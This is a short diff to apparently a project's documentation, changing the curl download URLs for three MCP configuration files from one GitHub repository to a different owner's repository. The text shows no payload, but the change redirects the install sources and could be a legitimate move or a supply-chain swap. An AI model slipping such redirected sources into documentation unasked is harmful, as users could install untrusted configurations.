@@ -260,15 +260,15 @@ MCPs can also be installed as JSON configuration files via direct download:
 ```bash
 # Install GitHub integration MCP
 curl -o ./github-integration.json \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/mcps/github-integration.json
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/mcps/github-integration.json
 
 # Install database integration MCP
 curl -o ./database-integration.json \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/mcps/database-integration.json
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/mcps/database-integration.json
 
 # Install DeepGraph React MCP
 curl -o ./deepgraph-react.json \
-  https://raw.githubusercontent.com/davila7/claude-code-templates/main/components/mcps/deepgraph-react.json
+  https://raw.githubusercontent.com/riskexec/claude-code/main/components/mcps/deepgraph-react.json
 ```
 
 ### Configuration Management
